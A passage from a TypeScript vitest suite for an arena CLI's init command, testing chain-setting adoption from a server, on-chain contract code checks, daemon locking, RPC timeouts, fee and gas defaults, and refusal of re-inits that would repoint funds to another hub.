import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { randomBytes } from "node:crypto";
import {
  KNOWN_DEPLOYMENTS,
  RPC_TIMEOUT_MS,
  arenaPaths,
  feeCeilingOf,
  livePidHoldingLock,
  loadConfig,
  runCli,
  startDaemonProcess,
  writeJsonAtomic,
} from "../src/index.js";
import { cliVersion } from "../src/version.js";

function templatesResponse(overrides: Record<string, unknown> = {}) {
  return [
    {
      id: "chess",
      version: "1",
      chainId: 31337,
      rpcUrl: "http://rpc.test",
      hub: `0x${"11".repeat(20)}`,
      usdc: `0x${"22".repeat(20)}`,
      rules: `0x${"33".repeat(20)}`,
      ...overrides,
    },
  ];
}

/** Serves `GET <server>/templates` and answers JSON-RPC POSTs to any other URL as a chain with `chainId` whose
 *  contracts are the addresses in `withCode`. Every request URL is recorded in `calls`.
 *  `faucetBalance` answers `eth_call` (the USDC `balanceOf` read); `faucetResponse` answers a POST to a
 *  `/faucet` URL -- both only matter for tests whose `templates` advertise a `faucet`. */
function stubFetch(
  opts: {
    templates?: unknown;
    chainId?: number;
    withCode?: string[];
    gasPrice?: bigint;
    faucetBalance?: bigint;
    faucetResponse?: { status: number; body: unknown };
  } = {},
) {
  const calls: Array<{ url: string; method?: string }> = [];
  // Task 3 fix round 1 (I3): init checks the USDC token's code too, so the default chain has all three contracts.
  const withCode = new Set(
    (opts.withCode ?? [`0x${"11".repeat(20)}`, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`]).map((a) => a.toLowerCase()),
  );
  const fetchStub = (async (url: string, init?: RequestInit) => {
    if (url.endsWith("/templates")) {
      calls.push({ url });
      return new Response(JSON.stringify(opts.templates ?? templatesResponse()));
    }
    if (url.endsWith("/faucet")) {
      calls.push({ url, method: "POST" });
      const r = opts.faucetResponse ?? { status: 200, body: { address: `0x${"ab".repeat(20)}`, usdc: "100000000", native: "1000000000000000000" } };
      return new Response(JSON.stringify(r.body), { status: r.status });
    }
    const req = JSON.parse(String(init?.body)) as { id: number; method: string; params: unknown[] };
    calls.push({ url, method: req.method });
    const result =
      req.method === "eth_chainId"
        ? `0x${(opts.chainId ?? 31337).toString(16)}`
        : req.method === "eth_gasPrice"
          ? `0x${(opts.gasPrice ?? 1_000_000_000n).toString(16)}`
          : req.method === "eth_call"
            ? `0x${(opts.faucetBalance ?? 0n).toString(16).padStart(64, "0")}`
            : withCode.has(String(req.params[0]).toLowerCase())
          ? "0x6080"
          : "0x";
    return new Response(JSON.stringify({ jsonrpc: "2.0", id: req.id, result }));
  }) as typeof fetch;
  return { fetchStub, calls };
}

describe("arena init --server", () => {
  it("arena init --server fills chain settings from /templates", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch();
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    expect(calls[0]).toEqual({ url: "http://host.test/templates" });
    expect(loadConfig(home)).toMatchObject({
      serverUrl: "http://host.test",
      rpcUrl: "http://rpc.test",
      chainId: 31337,
      hub: `0x${"11".repeat(20)}`,
    });
  });

  it("Final review I4: refuses to init while a live daemon holds this home's lock, naming the pid and how to stop it", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    writeFileSync(join(home, "daemon.lock"), JSON.stringify({ pid: process.pid }), { mode: 0o600 });
    const { fetchStub, calls } = stubFetch();
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).toBe(1);
    expect(err.join("\n")).toContain(`pid ${process.pid}`);
    expect(err.join("\n")).toContain(`kill ${process.pid}`);
    expect(calls).toHaveLength(0); // refused before ever reaching the network
  });

  it("Final review I4: a stale lock (dead pid) never blocks init -- only a genuinely live one does", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    writeFileSync(join(home, "daemon.lock"), JSON.stringify({ pid: 2 ** 22 + 12345 }), { mode: 0o600 });
    const { fetchStub } = stubFetch();
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: () => undefined,
    });
    expect(code).toBe(0);
    expect(livePidHoldingLock(home)).toBeNull(); // init took the stale lock over, then released it
  });

  it("Task 3 fix round 4 (N2): init holds the home lock for its whole run -- no daemon can start while it waits on a slow RPC", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const base = stubFetch();
    let unstall!: () => void;
    const stall = new Promise<void>((r) => (unstall = r));
    let reached!: () => void;
    const reachedChainId = new Promise<void>((r) => (reached = r));
    const fetchStub = (async (url: string, init?: RequestInit) => {
      if (!url.endsWith("/templates") && (JSON.parse(String(init?.body)) as { method: string }).method === "eth_chainId") {
        reached();
        await stall; // a slow (or hostile) RPC: init sits here, after its checks and before its write
      }
      return base.fetchStub(url, init);
    }) as typeof fetch;
    const err: string[] = [];
    const running = runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    await reachedChainId;
    expect(livePidHoldingLock(home)).toBe(process.pid);
    await expect(startDaemonProcess(home, { log: () => {} })).rejects.toThrow(`another arena daemon (pid ${process.pid}) is using ${home}`);
    unstall();
    expect(await running, err.join("\n")).toBe(0);
    expect(loadConfig(home).rpcUrl).toBe("http://rpc.test");
    expect(livePidHoldingLock(home)).toBeNull();
    expect(existsSync(join(home, "daemon.lock"))).toBe(false);
  });

  it("Task 3 fix round 4 (N2): a brand-new ARENA_HOME is created for the lock; a failed first init leaves no empty home behind", async () => {
    const parent = mkdtempSync(join(tmpdir(), "arena-init-"));
    const home = join(parent, "not", "yet");
    const ok = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: stubFetch().fetchStub,
      out: () => undefined,
      err: () => undefined,
    });
    expect(ok).toBe(0);
    expect(loadConfig(home).chainId).toBe(31337);
    expect(existsSync(join(home, "daemon.lock"))).toBe(false);

    const failed = join(parent, "refused");
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: failed },
      fetch: stubFetch({ chainId: 1 }).fetchStub, // the RPC serves another chain: refused before anything is written
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).toBe(1);
    expect(err.join("\n")).toContain("serves chain 0x1, not chain 31337");
    expect(existsSync(failed)).toBe(false);
  });

  it("Task 3 fix round 4 (N2): every RPC call carries a timeout, and an RPC that never answers fails init with a clear error", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const base = stubFetch();
    const signals: unknown[] = [];
    const fetchStub = (async (url: string, init?: RequestInit) => {
      if (url.endsWith("/templates")) return base.fetchStub(url, init);
      signals.push(init?.signal);
      // What fetch rejects with when its AbortSignal.timeout fires (here after 1 ms, not RPC_TIMEOUT_MS).
      const fired = AbortSignal.timeout(1);
      await new Promise((r) => setTimeout(r, 20));
      throw fired.reason;
    }) as typeof fetch;
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).toBe(1);
    expect(err.join("\n")).toContain(`RPC http://rpc.test did not answer eth_chainId within ${RPC_TIMEOUT_MS / 1000} s`);
    expect(RPC_TIMEOUT_MS).toBe(30_000);
    expect(signals).toHaveLength(1);
    expect(signals[0]).toBeInstanceOf(AbortSignal);
    expect(livePidHoldingLock(home)).toBeNull();
    expect(existsSync(arenaPaths(home).config)).toBe(false);
  });

  it("verifies the adopted chain over its RPC and prints every adopted value with a trust line (I8)", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch();
    const out: string[] = [];
    const err: string[] = [];
    const code = await runCli(["init", "--server", "https://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: (s) => err.push(s),
    });
    expect(code).toBe(0);
    expect(calls.filter((c) => c.method).map((c) => [c.url, c.method])).toEqual([
      ["http://rpc.test", "eth_chainId"],
      ["http://rpc.test", "eth_getCode"], // hub
      ["http://rpc.test", "eth_getCode"], // usdc (Task 3 fix round 1, I3)
      ["http://rpc.test", "eth_getCode"], // rules
      ["http://rpc.test", "eth_gasPrice"], // the default sessionGasWei (final review C1)
    ]);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed).toMatchObject({
      rpcUrl: "http://rpc.test",
      chainId: 31337,
      hub: `0x${"11".repeat(20)}`,
      usdc: `0x${"22".repeat(20)}`,
      rules: `0x${"33".repeat(20)}`,
    });
    expect(printed.trust).toMatch(/come from https:\/\/host\.test; verify them against a source you trust/);
    expect(err).toEqual([]); // https: no plain-http warning
  });

  it("final review I2: warns loudly when the hub or rules differ from the canonical deployment of a known chain", async () => {
    const run = async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const err: string[] = [];
      const code = await runCli(["init", "--server", "https://host.test"], {
        env: { ARENA_HOME: home },
        fetch: stubFetch().fetchStub,
        out: () => undefined,
        err: (s) => err.push(s),
      });
      return { code, err: err.join("\n") };
    };
    try {
      // The template serves hub 0x11.. and rules 0x33..; the canonical entry for its chain names another hub.
      KNOWN_DEPLOYMENTS[31337] = { name: "test chain", hub: `0x${"44".repeat(20)}`, rules: `0x${"33".repeat(20)}` };
      const bad = await run();
      expect(bad.code).toBe(0); // a warning, not a refusal
      expect(bad.err).toMatch(/WARNING: hub 0x1{40} is not the canonical test chain hub 0x4{40}/);
      expect(bad.err).not.toMatch(/rules .* is not the canonical/);
      // The canonical addresses themselves: no warning.
      KNOWN_DEPLOYMENTS[31337] = { name: "test chain", hub: `0x${"11".repeat(20)}`, rules: `0x${"33".repeat(20)}` };
      expect((await run()).err).not.toMatch(/WARNING/);
    } finally {
      delete KNOWN_DEPLOYMENTS[31337];
    }
    // An unknown chain id (the table is empty until Plan 6 fills in Arc mainnet): nothing to compare, no warning.
    expect((await run()).err).not.toMatch(/WARNING/);
  });

  describe("Plan 6 (spec §2.5, Review Focus 3): on a chain with a profile, init refuses a non-pinned USDC, hub or rules", () => {
    const ARC_USDC = "0x3600000000000000000000000000000000000000";
    const HUB = `0x${"11".repeat(20)}` as const;
    const RULES = `0x${"33".repeat(20)}` as const;
    const OTHER = `0x${"44".repeat(20)}` as const;
    const arcChain = (chainId: number, withCode = [HUB, RULES, OTHER, ARC_USDC, `0x${"22".repeat(20)}`]) => ({ chainId, withCode });
    const explicit = (o: { chainId?: number; hub?: string; usdc?: string; rules?: string } = {}) => [
      "init", "--server", "https://host.test", "--rpc", "http://rpc.test", "--chain-id", String(o.chainId ?? 5042002),
      "--hub", o.hub ?? HUB, "--usdc", o.usdc ?? ARC_USDC, "--rules", o.rules ?? RULES, "--session-gas-wei", "10000000000000000",
    ];
    const fromServer = ["init", "--server", "https://host.test", "--session-gas-wei", "10000000000000000"];
    const run = async (home: string, args: string[], stub: ReturnType<typeof stubFetch>) => {
      const err: string[] = [];
      const code = await runCli(args, { env: { ARENA_HOME: home }, fetch: stub.fetchStub, out: () => undefined, err: (s) => err.push(s) });
      return { code, err: err.join("\n"), calls: stub.calls };
    };
    const freshHome = () => join(mkdtempSync(join(tmpdir(), "arena-init-arc-")), "home");
    const pin = async <T>(chainId: number, entry: { name: string; hub: `0x${string}`; rules: `0x${string}` }, body: () => Promise<T>): Promise<T> => {
      KNOWN_DEPLOYMENTS[chainId] = entry;
      try {
        return await body();
      } finally {
        delete KNOWN_DEPLOYMENTS[chainId];
      }
    };

    it("a USDC other than the profile's is refused -- from /templates or from --usdc, on 5042 and 5042002 -- before any RPC call, writing nothing", async () => {
      for (const [chainId, name] of [[5042002, "Arc Testnet"], [5042, "Arc"]] as const) {
        // The host publishes its own "USDC" for the chain.
        const home1 = freshHome();
        const viaTemplates = await run(home1, fromServer, stubFetch({ templates: templatesResponse({ chainId }), ...arcChain(chainId) }));
        expect(viaTemplates.code, name).toBe(1);
        expect(viaTemplates.err).toContain(`refusing to init on ${name} (chain ${chainId}): usdc 0x${"22".repeat(20)} is not ${name}'s USDC ${ARC_USDC}`);
        expect(viaTemplates.calls.map((c) => c.method ?? "templates"), name).toEqual(["templates"]); // no RPC call at all
        expect(existsSync(home1), name).toBe(false); // a failed first init leaves no home behind

        // The same address as an explicit flag.
        const home2 = freshHome();
        const viaFlag = await run(home2, explicit({ chainId, usdc: `0x${"22".repeat(20)}` }), stubFetch(arcChain(chainId)));
        expect(viaFlag.code, name).toBe(1);
        expect(viaFlag.err).toContain(`usdc 0x${"22".repeat(20)} is not ${name}'s USDC ${ARC_USDC}`);
        expect(viaFlag.calls, name).toEqual([]);
        expect(existsSync(home2), name).toBe(false);
      }
    });

    it("with no pinned deployment, the profile's USDC (any case) is accepted with any hub and rules that hold code", async () => {
      const home = freshHome();
      const r = await run(home, fromServer, stubFetch({ templates: templatesResponse({ chainId: 5042002, usdc: ARC_USDC.toUpperCase().replace("0X", "0x") }), ...arcChain(5042002) }));
      expect(r.code, r.err).toBe(0);
      expect(loadConfig(home)).toMatchObject({ chainId: 5042002, hub: HUB, rules: RULES });
      expect(r.err).not.toMatch(/WARNING|refusing/);
    });

    it("once the chain's deployment is pinned, another hub or rules is refused -- from /templates or from flags", async () => {
      await pin(5042002, { name: "Arc Testnet", hub: OTHER, rules: RULES }, async () => {
        const viaTemplates = await run(freshHome(), fromServer, stubFetch({ templates: templatesResponse({ chainId: 5042002, usdc: ARC_USDC }), ...arcChain(5042002) }));
        expect(viaTemplates.code).toBe(1);
        expect(viaTemplates.err).toContain(`refusing to init on Arc Testnet (chain 5042002): hub ${HUB} is not the pinned Arc Testnet hub ${OTHER}`);
        expect(viaTemplates.calls.map((c) => c.method ?? "templates")).toEqual(["templates"]);

        const viaFlag = await run(freshHome(), explicit({ hub: HUB }), stubFetch(arcChain(5042002)));
        expect(viaFlag.code).toBe(1);
        expect(viaFlag.err).toContain(`hub ${HUB} is not the pinned Arc Testnet hub ${OTHER}`);
        expect(viaFlag.calls).toEqual([]);

        const badRules = await run(freshHome(), explicit({ hub: OTHER, rules: HUB }), stubFetch(arcChain(5042002)));
        expect(badRules.code).toBe(1);
        expect(badRules.err).toContain(`rules ${HUB} is not the pinned Arc Testnet rules ${RULES}`);
        expect(badRules.err).not.toMatch(/hub .* is not the pinned/);

        // The pinned deployment itself, any case: accepted.
        const home = freshHome();
        const ok = await run(home, explicit({ hub: OTHER.toUpperCase().replace("0X", "0x") }), stubFetch(arcChain(5042002)));
        expect(ok.code, ok.err).toBe(0);
        expect(ok.err).not.toMatch(/WARNING|refusing/);

        // A pin on 5042002 says nothing about Arc mainnet (5042): its own profile USDC check still applies there.
        const mainnet = await run(freshHome(), explicit({ chainId: 5042, hub: HUB }), stubFetch(arcChain(5042)));
        expect(mainnet.code, mainnet.err).toBe(0);
      });
    });

    it("re-running init on an existing home is checked too: a home whose hub is no longer the pinned one is refused, config.json unchanged", async () => {
      const home = freshHome();
      expect((await run(home, explicit(), stubFetch(arcChain(5042002)))).code).toBe(0);
      const before = readFileSync(join(home, "config.json"), "utf8");
      await pin(5042002, { name: "Arc Testnet", hub: OTHER, rules: RULES }, async () => {
        const r = await run(home, explicit(), stubFetch(arcChain(5042002)));
        expect(r.code).toBe(1);
        expect(r.err).toContain(`hub ${HUB} is not the pinned Arc Testnet hub ${OTHER}`);
        expect(r.calls).toEqual([]);
      });
      expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
    });

    describe("Plan 6 Task 2 (spec §2.3, §2.4): the fee ceiling and the session gas on a chain with a profile", () => {
      const ARC_SESSION_GAS = 336_000_000_000_000_000n; // 4 x 2.1M gas x 40 gwei = 0.336 USDC
      /** `explicit(...)` without its `--session-gas-wei`, so init derives the default. */
      const derived = (o: Parameters<typeof explicit>[0] = {}, extra: string[] = []) => {
        const a = explicit(o);
        const i = a.indexOf("--session-gas-wei");
        return [...a.slice(0, i), ...a.slice(i + 2), ...extra];
      };

      it("the ceiling defaults to the profile's 40 gwei, and sessionGasWei to 4 x 2.1M gas x that, with no eth_gasPrice call", async () => {
        for (const [chainId, name] of [[5042002, "Arc Testnet"], [5042, "Arc"]] as const) {
          const home = freshHome();
          const r = await run(home, derived({ chainId }), stubFetch({ ...arcChain(chainId), gasPrice: 25_000_000_000n }));
          expect(r.code, r.err).toBe(0);
          const cfg = loadConfig(home);
          expect(cfg.sessionGasWei, name).toBe(ARC_SESSION_GAS); // before: 4 x 2.1M x 4 x 25 gwei = 0.84
          expect(cfg.feeCeilingWei, name).toBeUndefined(); // nothing written: the profile's value applies
          expect(feeCeilingOf(cfg), name).toBe(40_000_000_000n);
          expect(r.calls.some((c) => c.method === "eth_gasPrice"), name).toBe(false);
        }
      });

      it("an explicit ceiling at or over the floor is kept, and sessionGasWei stays the profile's (the ruling); --session-gas-wei still overrides", async () => {
        const home = freshHome();
        const r = await run(home, derived({}, ["--fee-ceiling-wei", "60000000000"]), stubFetch(arcChain(5042002)));
        expect(r.code, r.err).toBe(0);
        expect(loadConfig(home)).toMatchObject({ feeCeilingWei: 60_000_000_000n, sessionGasWei: ARC_SESSION_GAS });
        const atFloor = freshHome();
        expect((await run(atFloor, derived({}, ["--fee-ceiling-wei", "20000000000"]), stubFetch(arcChain(5042002)))).code).toBe(0);
        expect(loadConfig(atFloor).feeCeilingWei).toBe(20_000_000_000n);
        const explicitGas = freshHome();
        expect((await run(explicitGas, explicit(), stubFetch(arcChain(5042002)))).code).toBe(0);
        expect(loadConfig(explicitGas).sessionGasWei).toBe(10n ** 16n);
      });

      it("--fee-ceiling-wei under the floor is refused -- from flags or with /templates -- before any RPC call, writing nothing", async () => {
        for (const [chainId, name] of [[5042002, "Arc Testnet"], [5042, "Arc"]] as const) {
          const home = freshHome();
          const r = await run(home, [...explicit({ chainId }), "--fee-ceiling-wei", "19999999999"], stubFetch(arcChain(chainId)));
          expect(r.code, name).toBe(2);
          expect(r.err).toContain(`--fee-ceiling-wei 19999999999 is under ${name}'s fee floor of 20000000000 wei per gas`);
          expect(r.calls, name).toEqual([]);
          expect(existsSync(home), name).toBe(false);
        }
        const viaTemplates = freshHome();
        const t = await run(
          viaTemplates,
          [...fromServer, "--fee-ceiling-wei", "1"],
          stubFetch({ templates: templatesResponse({ chainId: 5042002, usdc: ARC_USDC }), ...arcChain(5042002) }),
        );
        expect(t.code).toBe(2);
        expect(t.calls.map((c) => c.method ?? "templates")).toEqual(["templates"]); // no RPC call at all
        expect(existsSync(viaTemplates)).toBe(false);
      });

      it("a chain without a profile is unchanged: any ceiling is accepted, and sessionGasWei follows max(ceiling, 4 x the gas price)", async () => {
        const home = freshHome();
        const r = await run(home, ["init", "--server", "https://host.test", "--fee-ceiling-wei", "1"], stubFetch({ gasPrice: 1_000_000_000n }));
        expect(r.code, r.err).toBe(0);
        expect(loadConfig(home)).toMatchObject({ chainId: 31337, feeCeilingWei: 1n, sessionGasWei: 4n * 2_100_000n * 4_000_000_000n });
        expect(r.calls.some((c) => c.method === "eth_gasPrice")).toBe(true);
      });
    });

    it("a chain without a profile keeps today's warning-only behaviour, even with a table entry (31337)", async () => {
      await pin(31337, { name: "test chain", hub: OTHER, rules: OTHER }, async () => {
        const r = await run(freshHome(), explicit({ chainId: 31337, usdc: `0x${"22".repeat(20)}` }), stubFetch({ withCode: [HUB, RULES, `0x${"22".repeat(20)}`] }));
        expect(r.code, r.err).toBe(0);
        expect(r.err).toMatch(/WARNING: hub 0x1{40} is not the canonical test chain hub 0x4{40}/);
        expect(r.err).toMatch(/WARNING: rules 0x3{40} is not the canonical test chain rules 0x4{40}/);
        expect(r.err).not.toMatch(/refusing/);
      });
    });
  });

  it("final review C1: the default sessionGasWei is 4 x 2.1M gas x max(fee ceiling, 4 x the RPC's gas price); the floor defaults to half", async () => {
    const init = async (args: string[], gasPrice: bigint) => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub, calls } = stubFetch({ gasPrice });
      const out: string[] = [];
      const code = await runCli(["init", "--server", "https://host.test", ...args], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: (s) => out.push(s),
        err: () => undefined,
      });
      expect(code).toBe(0);
      return { cfg: loadConfig(home), calls, printed: JSON.parse(out.join("\n")) as Record<string, unknown> };
    };
    const G = 2_100_000n;
    // A quiet chain (1 gwei): the default wallet fee ceiling (100 gwei) is the higher.
    const quiet = await init([], 1_000_000_000n);
    expect(quiet.cfg.sessionGasWei).toBe(4n * G * 100_000_000_000n);
    expect(quiet.printed.sessionGasWei).toBe((4n * G * 100_000_000_000n).toString());
    // A busy chain (50 gwei): 4 x the estimate is the higher.
    expect((await init([], 50_000_000_000n)).cfg.sessionGasWei).toBe(4n * G * 200_000_000_000n);
    // An explicit ceiling counts.
    expect((await init(["--fee-ceiling-wei", "300000000000"], 1_000_000_000n)).cfg.sessionGasWei).toBe(4n * G * 300_000_000_000n);
    // --session-gas-wei overrides it (and the RPC's price is not even asked); --session-gas-floor sets the floor.
    const explicit = await init(["--session-gas-wei", "123", "--session-gas-floor", "100"], 1_000_000_000n);
    expect(explicit.cfg.sessionGasWei).toBe(123n);
    expect(explicit.cfg.sessionGasFloor).toBe(100n);
    expect(explicit.calls.some((c) => c.method === "eth_gasPrice")).toBe(false);
    expect(quiet.cfg.sessionGasFloor).toBeUndefined(); // the daemon defaults it to half of sessionGasWei
  });

  it("Plan 5 Task 1: refuses --session-gas-floor greater than sessionGasWei", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub } = stubFetch();
    const err: string[] = [];
    const code = await runCli(
      ["init", "--server", "http://host.test", "--session-gas-wei", "1000", "--session-gas-floor", "1001"],
      { env: { ARENA_HOME: home }, fetch: fetchStub, out: () => undefined, err: (s) => err.push(s) },
    );
    expect(code).not.toBe(0);
    expect(err.join("\n")).toMatch(/--session-gas-floor \(1001\) must not exceed --session-gas-wei \(1000\)/);
    expect(() => loadConfig(home)).toThrow(); // nothing written
    // Equal is fine.
    const ok = await runCli(
      ["init", "--server", "http://host.test", "--session-gas-wei", "1000", "--session-gas-floor", "1000"],
      { env: { ARENA_HOME: home }, fetch: fetchStub, out: () => undefined, err: () => undefined },
    );
    expect(ok).toBe(0);
  });

  it("fails when the adopted RPC serves another chain id", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub } = stubFetch({ chainId: 1 });
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).toBe(1);
    expect(err.join("\n")).toMatch(/serves chain 0x1, not chain 31337/);
    expect(() => loadConfig(home)).toThrow(); // nothing written
  });

  it("reports a malformed eth_chainId or a non-JSON RPC body as an RPC error", async () => {
    const cases: Array<[string, () => Response]> = [
      ["malformed eth_chainId", () => new Response(JSON.stringify({ jsonrpc: "2.0", id: 1, result: "31337" }))],
      ["not JSON", () => new Response("<html>502 Bad Gateway</html>")],
    ];
    for (const [label, rpcResponse] of cases) {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const fetchStub = (async (url: string) =>
        url.endsWith("/templates") ? new Response(JSON.stringify(templatesResponse())) : rpcResponse()) as typeof fetch;
      const err: string[] = [];
      const code = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: () => undefined,
        err: (s) => err.push(s),
      });
      expect(code, label).toBe(1);
      expect(err.join("\n"), label).toMatch(/^error: RPC http:\/\/rpc\.test /m);
    }
  });

  it("fails when an adopted hub, USDC or rules address has no code", async () => {
    const all = { hub: `0x${"11".repeat(20)}`, usdc: `0x${"22".repeat(20)}`, rules: `0x${"33".repeat(20)}` };
    for (const missing of ["hub", "usdc", "rules"] as const) {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub } = stubFetch({ withCode: Object.entries(all).filter(([k]) => k !== missing).map(([, v]) => v) });
      const err: string[] = [];
      const code = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: () => undefined,
        err: (s) => err.push(s),
      });
      expect(code).toBe(1);
      expect(err.join("\n")).toMatch(new RegExp(`${missing} 0x[0-9a-f]{40} has no contract code`));
    }
  });

  it("warns about a plain-http server that is not loopback, but not about a loopback one", async () => {
    for (const [server, warned] of [["http://host.test", true], ["http://127.0.0.1:8080", false]] as const) {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub } = stubFetch();
      const err: string[] = [];
      const code = await runCli(["init", "--server", server], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: () => undefined,
        err: (s) => err.push(s),
      });
      expect(code).toBe(0);
      expect(err.some((l) => /warning: .* is plain http/.test(l))).toBe(warned);
    }
  });

  it("with every chain setting (and --session-gas-wei) explicit, reads no /templates and prints no trust line, but still checks the chain and all three contracts' code (fix round 1, I3)", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch();
    const out: string[] = [];
    const code = await runCli(
      ["init", "--server", "http://host.test", "--rpc", "http://rpc.test", "--chain-id", "31337",
        "--hub", `0x${"11".repeat(20)}`, "--usdc", `0x${"22".repeat(20)}`, "--rules", `0x${"33".repeat(20)}`,
        "--session-gas-wei", "10000000000000000"],
      { env: { ARENA_HOME: home }, fetch: fetchStub, out: (s) => out.push(s), err: () => undefined },
    );
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.hub).toBe(`0x${"11".repeat(20)}`);
    expect(printed.trust).toBeUndefined();
    expect(calls).toEqual([
      { url: "http://rpc.test", method: "eth_chainId" },
      { url: "http://rpc.test", method: "eth_getCode" },
      { url: "http://rpc.test", method: "eth_getCode" },
      { url: "http://rpc.test", method: "eth_getCode" },
    ]);
  });

  describe("Task 3 fix round 1 (I3, spec §4.3): init never repoints the money", () => {
    const explicit = (o: { rpc?: string; chainId?: string; hub?: string; usdc?: string; rules?: string; server?: string } = {}) => [
      "init", "--server", o.server ?? "http://host.test", "--rpc", o.rpc ?? "http://rpc.test", "--chain-id", o.chainId ?? "31337",
      "--hub", o.hub ?? `0x${"11".repeat(20)}`, "--usdc", o.usdc ?? `0x${"22".repeat(20)}`, "--rules", o.rules ?? `0x${"33".repeat(20)}`,
      "--session-gas-wei", "10000000000000000",
    ];
    const run = async (home: string, args: string[], stub = stubFetch()) => {
      const err: string[] = [];
      const code = await runCli(args, { env: { ARENA_HOME: home }, fetch: stub.fetchStub, out: () => undefined, err: (s) => err.push(s) });
      return { code, err: err.join("\n"), calls: stub.calls };
    };

    it("a re-init that would change the hub, USDC, rules or chain is refused (exit 1) before any network call, and writes nothing", async () => {
      const otherCode = [`0x${"11".repeat(20)}`, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`, `0x${"44".repeat(20)}`];
      for (const [what, args] of [
        ["hub", explicit({ hub: `0x${"44".repeat(20)}` })],
        ["usdc", explicit({ usdc: `0x${"44".repeat(20)}` })],
        ["rules", explicit({ rules: `0x${"44".repeat(20)}` })],
        ["chainId", explicit({ chainId: "1" })],
      ] as const) {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect((await run(home, explicit())).code).toBe(0);
        const before = readFileSync(join(home, "config.json"), "utf8");
        const r = await run(home, [...args], stubFetch({ withCode: otherCode, chainId: what === "chainId" ? 1 : 31337 }));
        expect(r.code, what).toBe(1);
        expect(r.err, what).toContain(`this home's funds are bound to hub 0x${"11".repeat(20)} on chain 31337; withdraw to your owner, then use a fresh ARENA_HOME`);
        expect(r.err, what).toContain(`refusing to change ${what}`);
        expect(r.calls, what).toEqual([]);
        expect(readFileSync(join(home, "config.json"), "utf8"), what).toBe(before);
      }
    });

    it("the same goes for a re-init whose new chain settings come from a server's /templates", async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      expect((await run(home, explicit())).code).toBe(0);
      const evil = stubFetch({ templates: templatesResponse({ hub: `0x${"44".repeat(20)}` }), withCode: [`0x${"44".repeat(20)}`, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`] });
      const r = await run(home, ["init", "--server", "https://moved.example", "--session-gas-wei", "1"], evil);
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/funds are bound to hub/);
      expect(loadConfig(home).hub).toBe(`0x${"11".repeat(20)}`);
      expect(loadConfig(home).serverUrl).toBe("http://host.test");
    });

    it("a re-init may change the RPC URL and the server URL (and still checks the code over the new RPC)", async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      expect((await run(home, explicit())).code).toBe(0);
      const r = await run(home, explicit({ rpc: "http://other-rpc.test", server: "http://other-host.test" }));
      expect(r.code, r.err).toBe(0);
      expect(r.calls.map((c) => c.url)).toEqual(Array(4).fill("http://other-rpc.test"));
      expect(loadConfig(home)).toMatchObject({ rpcUrl: "http://other-rpc.test", serverUrl: "http://other-host.test", hub: `0x${"11".repeat(20)}` });
    });

    describe("fix round 3: the RPC changes only once every channel is finalized", () => {
      /** A channel record in `home` (only the fields the check reads), finalized or not. */
      const channel = (home: string, finalized: boolean): string => {
        const channelId = `0x${randomBytes(32).toString("hex")}`;
        writeJsonAtomic(arenaPaths(home).channelRecord(channelId as `0x${string}`), { channelId, finalized, sessionKey: `0x${"01".repeat(32)}` });
        return channelId;
